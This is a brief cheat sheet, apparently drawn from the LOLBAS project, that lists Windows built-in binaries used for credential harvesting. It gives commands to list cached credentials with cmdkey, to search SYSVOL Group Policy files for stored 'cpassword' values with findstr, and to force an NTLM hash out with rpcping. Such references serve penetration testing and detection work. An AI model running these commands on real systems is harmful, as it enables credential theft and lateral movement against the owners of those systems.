# Credential Harvesting
1. cmdkey
https://lolbas-project.github.io/lolbas/Binaries/Cmdkey/#credentials

List cached credentials
```
cmdkey /list
```

2. findstr
https://lolbas-project.github.io/lolbas/Binaries/Findstr/#credentials

Search for stored password in Group Policy files stored on SYSVOL.
```
findstr /S /I cpassword \\sysvol\policies\*.xml
```

3. rpcping
https://lolbas-project.github.io/lolbas/Binaries/Rpcping/#credentials

Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.
```
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
```
